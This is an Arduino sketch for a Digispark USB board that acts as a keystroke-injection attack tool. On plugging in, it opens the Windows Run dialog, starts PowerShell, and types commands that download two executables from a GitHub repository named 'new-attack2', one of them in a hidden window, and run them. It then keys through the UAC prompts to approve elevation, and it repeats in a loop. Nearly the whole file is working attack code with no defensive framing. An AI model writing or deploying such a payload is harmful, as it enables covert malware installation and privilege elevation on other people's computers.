#include "DigiKeyboard.h"
#define KEY_TAB 0x2b
#define KEY_LEFT_ARROW 0x50

void setup() {
  pinMode(1, OUTPUT); // LED on Model A
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);  // Clear any key presses
  DigiKeyboard.delay(5000);  // Wait for 3 seconds
  
  // Open Run dialog (Win + R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);  // Wait for Run dialog to open

  // Type 'powershell' in the Run dialog to open PowerShell
  DigiKeyboard.print(F("powershell"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);  // Wait for PowerShell to open

   DigiKeyboard.println(F("powershell -command \"(New-Object System.Net.WebClient).DownloadFile('https://github.com/rahmou1/new-attack2/raw/refs/heads/main/folder.exe', '$env:UserProfile\\Desktop\\folder.exe'); Invoke-Item '$env:UserProfile\\Desktop\\folder.exe'\""));
  
  DigiKeyboard.delay(5000);  // Wait for UAC prompt to appear
  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);  // Tab to "Yes" button
  DigiKeyboard.delay(5000);  // Wait for selection
  DigiKeyboard.sendKeyStroke(KEY_ENTER);  // Press Enter to confirm "Yes"
    DigiKeyboard.delay(6000);  // Wait for selection
  // Run the download command
  DigiKeyboard.println(F("powershell -windowstyle hidden -command \"(New-Object System.Net.WebClient).DownloadFile('https://github.com/rahmou1/new-attack2/raw/refs/heads/main/Anti_check.exe', '$env:UserProfile\\Desktop\\source\\Anti_check.exe'); Invoke-Item '$env:UserProfile\\Desktop\\source\\Anti_check.exe'\""));
  // DigiKeyboard.delay(2000);  // Wait for the file to open

  // Handle UAC prompt
  DigiKeyboard.delay(5000);  // Wait for UAC prompt to appear
 DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);  // Tab to "Yes" button
  DigiKeyboard.delay(5000);  // Wait for selection
  DigiKeyboard.sendKeyStroke(KEY_ENTER);  // Press Enter to confirm "Yes"
  


  // Turn on LED when program finishes
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(90000);  // Wait for 90 seconds
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);  // Wait 5 seconds before repeating
}


